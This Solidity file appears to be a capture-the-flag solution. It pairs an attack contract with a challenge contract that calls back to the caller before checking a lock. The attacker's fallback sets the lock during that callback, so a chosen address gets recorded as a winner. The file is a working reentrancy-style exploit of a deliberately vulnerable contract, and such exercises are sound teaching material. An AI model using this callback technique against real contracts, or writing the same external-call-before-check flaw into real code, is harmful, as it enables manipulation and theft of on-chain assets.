// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "./challenge.sol";

contract Attack1 {
    Challenge public challenge;

    constructor() {
        challenge = Challenge(0xcD7AB80Da7C893f86fA8deDDf862b74D94f4478E);
    }

    // Fallback is called when DepositFunds sends Ether to this contract.
    fallback() external payable {
        challenge.lock_me();
    }

    function attack() external payable {
        challenge.exploit_me(0xe862CE2def28b4E5c9b427a357774d8d9e8092Fc);
    }
}

pragma solidity 0.8.10;

// The goal of this challenge is to be able to sign offchain a message
// with an address stored in winners.
contract Challenge {
    address[] public winners;
    bool lock;

    function exploit_me(address winner) public {
        lock = false;

        msg.sender.call("");

        require(lock);
        winners.push(winner);
    }

    function lock_me() public {
        lock = true;
    }
}